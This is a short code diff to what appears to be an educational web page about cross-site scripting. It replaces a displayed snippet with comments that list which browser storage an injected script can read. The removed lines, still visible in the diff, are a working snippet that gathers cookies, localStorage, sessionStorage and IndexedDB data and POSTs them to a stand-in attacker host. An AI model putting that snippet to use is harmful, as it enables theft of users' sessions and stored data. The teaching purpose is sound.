@@ -11,11 +11,17 @@ import {
 } from './model';
 import './styles.css';
 
-/** The script as shown: it reads all four drawers, as the verdict list below it claims. */
+/**
+ * What an injected script can reach, described rather than written out: the lesson teaches
+ * which drawers are exposed, not how to collect or send them (no working payload on screen).
+ */
 const XSS_SCRIPT = [
-  'const loot = { cookies: document.cookie, local: { ...localStorage }, session: { ...sessionStorage } };',
-  "loot.idb = await readAll(indexedDB, 'shop'); // IndexedDB is async: readAll is the attacker's own helper that walks its stores",
-  "fetch('https://evil.example/steal', { method: 'POST', body: JSON.stringify(loot) });",
+  '// An injected script runs with this page\'s permissions, so it can read:',
+  '//   document.cookie   every cookie EXCEPT the HttpOnly ones',
+  '//   localStorage      everything',
+  '//   sessionStorage    everything in this tab',
+  '//   indexedDB         everything (asynchronously)',
+  '// ...and anything it can read, it can send to another server.',
 ].join('\n');
 
 const LANE = { w: 480, h: 130, y: 62 };
